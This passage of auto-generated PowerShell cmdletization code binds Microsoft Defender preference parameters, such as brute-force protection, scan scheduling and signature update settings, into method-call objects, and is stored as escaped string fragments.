[object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionAggressiveness')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionAggressiveness}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionAggressiveness'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionAggressiveness'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RemoteEncryptionProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${RemoteEncryptionProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteEncryptionProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionConfiguredState')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionConfiguredState}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionConfiguredState'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionConfiguredState'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionMaxBlockTime')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionMaxBlockTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionMaxBlockTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionMaxBlockTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionAggressiveness')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionAggressiveness}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionAggressiveness'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionAggressiveness'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('BruteForceProtectionExclusions')) {\r\n          [object]$__cmdletization_value = ${BruteForceProtectionExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'BruteForceProtectionExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingAdditionalActionTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingAdditionalActionTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingAdditionalActionTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingCriticalFailureTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingCriticalFailureTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.Swi"
"tchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingCriticalFailureTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportingNonCriticalTimeOut')) {\r\n          [object]$__cmdletization_value = ${ReportingNonCriticalTimeOut}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportingNonCriticalTimeOut'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ServiceHealthReportInterval')) {\r\n          [object]$__cmdletization_value = ${ServiceHealthReportInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ServiceHealthReportInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ReportDynamicSignatureDroppedEvent')) {\r\n          [object]$__cmdletization_value = ${ReportDynamicSignatureDroppedEvent}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ReportDynamicSignatureDroppedEvent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanAvgCPULoadFactor')) {\r\n          [object]$__cmdletization_value = ${ScanAvgCPULoadFactor}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanAvgCPULoadFactor'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CheckForSignaturesBeforeRunningScan')) {\r\n          [object]$__cmdletization_value = ${CheckForSignaturesBeforeRunningScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CheckForSignaturesBeforeRunningScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanPurgeItemsAfterDelay')) {\r\n          [object]$__cmdletization_value = ${ScanPurgeItemsAfterDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPurgeItemsAfterDelay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanOnlyIfIdleEnabled')) {\r\n          [object]$__cmdletization_value = ${ScanOnlyIfIdleEnabled}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanOnlyIfIdleEnabled'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanParameters')) {\r\n          [object]$__cmdletization_value = ${ScanParameters}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanParameters'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleDay')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleQuickScanTime')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleQuickScanTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {\r\n          [object]$__cmdletization_value = ${ScanScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {\r\n          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {\r\n          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {\r\n          [object]$__cmdletization_value = ${SignatureAuGracePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {\r\n          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r"
"\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {\r\n          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {\r\n          [object]$__cmdletization_value = ${SignatureFallbackOrder}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {\r\n          [object]$__cmdletization_value = ${SharedSignaturesPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPathUpdateAtScheduledTimeOnly')) {\r\n          [object]$__cmdletization_value = ${SharedSignaturesPathUpdateAtScheduledTimeOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPathUpdateAtScheduledTimeOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPathUpdateAtScheduledTimeOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {\r\n          [object]$__cmdletization_value = ${SignatureScheduleDay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {\r\n          [object]$__cmdletization_value = ${SignatureScheduleTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureUpdateInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {\r\n          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SignatureBlobFileSharesSources')) {\r\n          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 